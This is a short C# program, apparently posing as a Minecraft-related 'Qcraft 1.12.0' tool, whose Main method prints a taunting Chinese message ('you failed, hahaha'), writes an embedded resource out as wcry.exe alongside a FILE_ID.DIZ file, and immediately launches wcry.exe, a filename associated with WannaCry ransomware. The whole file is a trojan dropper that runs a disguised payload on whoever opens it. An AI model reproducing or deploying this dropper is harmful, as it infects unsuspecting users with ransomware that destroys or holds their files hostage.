using System;
using System.Diagnostics;
using System.IO;
using Qcraft1._12._0.Properties;

namespace Qcraft1._12._0;

internal class Program
{
	private static StreamWriter myStream;

	private static void Main(string[] args)
	{
		Console.WriteLine("你失败了,哈哈哈");
		myStream = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "\\wcry.exe");
		myStream.Write(Resources.wcry);
		myStream.Close();
		myStream = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "\\FILE_ID.DIZ");
		myStream.Write(Resources.FILE_ID);
		myStream.Close();
		Process.Start(AppDomain.CurrentDomain.BaseDirectory + "\\wcry.exe");
	}
}
